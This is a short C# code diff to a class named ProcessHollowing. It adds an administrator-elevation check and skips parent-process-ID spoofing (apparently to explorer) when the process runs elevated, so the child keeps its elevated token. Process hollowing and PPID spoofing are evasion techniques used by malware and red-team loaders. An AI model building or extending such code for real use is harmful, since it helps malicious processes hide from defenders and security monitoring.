@@ -175,10 +175,22 @@ internal static class ProcessHollowing
     /// envOverrides: null value = remove key, non-null = set key.
     /// Returns the new PID, or -1 on failure.
     /// </summary>
+    private static bool IsElevated()
+    {
+        try
+        {
+            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
+            return new System.Security.Principal.WindowsPrincipal(id)
+                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+        catch { return false; }
+    }
+
     public static int SpawnDetached(string exePath, IReadOnlyDictionary<string, string?> envOverrides)
     {
         nint envBlock = BuildEnvBlock(envOverrides);
-        nint hParent  = GetSpoofParentHandle();
+        // Skip PPID spoof when elevated — spoofing to explorer gives non-elevated token to child
+        nint hParent  = IsElevated() ? 0 : GetSpoofParentHandle();
         nint attrList = 0, hParentPtr = 0;
         var  siEx = new STARTUPINFOEXW();
         siEx.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEXW>();
